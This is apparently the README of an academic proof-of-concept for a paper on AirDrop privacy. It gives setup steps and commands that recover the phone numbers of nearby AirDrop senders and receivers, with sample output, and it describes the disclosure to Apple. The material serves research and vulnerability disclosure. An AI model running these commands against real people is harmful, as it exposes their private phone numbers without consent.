# PoC: AirDrop Phone Number Leak

This PoC demonstrates the contact identifier leakage in Apple AirDrop that was described in

* **[HHSSW21]** Alexander Heinrich, Matthias Hollick, Thomas Schneider, Milan Stute, and Christian Weinert. **PrivateDrop: Practical Privacy-Preserving Authentication for Apple AirDrop** in _30th USENIX Security Symposium_. [Website](https://privatedrop.github.io). [Preprint](https://www.usenix.org/system/files/sec21fall-heinrich.pdf).

The paper also proposes a privacy-preserving drop-in replacement for Apple AirDrop.

**We notified Apple about this vulnerability on May 11, 2019. Until today, Apple has neither mitigated the issue nor informed us that they are planning to do so.
This means that current Apple systems are still vulnerable (iOS 14.5 and macOS 11.3 as of May 5, 2021).**

## Installation

Run the following instructions on a Mac (tested with macOS 11.2.3).

1. Checkout the repository.

```bash
git clone https://github.com/seemoo-lab/opendrop.git
cd opendrop
git checkout poc-phonenumber-leak
git submodule update --init
```

2. Install Python dependencies.

```bash
pip3 install -r requirements.txt
```

3. Build [_RainbowPhones_](https://github.com/contact-discovery/rt_phone_numbers).

```bash
brew install libomp
cd rt_phone_numbers
make -f Makefile.macOS
cd ..
```

## Usage

Our PoC is able to exploit both vulnerabilities explained in [HHSSW21]. We provide usage instructions below. 

**Disclaimer:** We omit precomputed rainbow tables generated with [_RainbowPhones_](https://github.com/contact-discovery/rt_phone_numbers)'s `rtgen` in this PoC.
Consequently, you will see the following message when running this PoC without modification: _"Could not recover hashed phone number: No rainbow tables provided."_ 

### Contact Identifier Leakage of Sender (§3.3 in [HHSSW21])

Simply run the following and wait for someone in proximity to open the AirDrop sharing menu.

```bash
python3 -m opendrop receive
```

An example output would look like this:

```
Announcing service: host opendrop, address fe80::c8b9:fbff:fee9:d544, port 8771
Starting HTTPS server
Nearby phone number: +49<...>
```

### Contact Identifier Leakage of Receiver (§3.4 in [HHSSW21])

Exploiting this vulnerability requires the victim to have the attacker in their address book. 
In particular, the attacker needs to present a valid AirDrop certificate containing its contact identifiers to the victim.
You can follow [these instructions](https://github.com/seemoo-lab/airdrop-keychain-extractor) to extract your current AirDrop certificate and use it with OpenDrop.
This attack does not require any interaction on part of the victim. Simply run:

```bash
python3 -m opendrop find
```

An example output would look like this:

```
Looking for receivers. Press Ctrl+C to stop ...
Nearby phone number: +49<...>
Found  index 0  ID a019b536c38b  name John Doe's iPhone
```
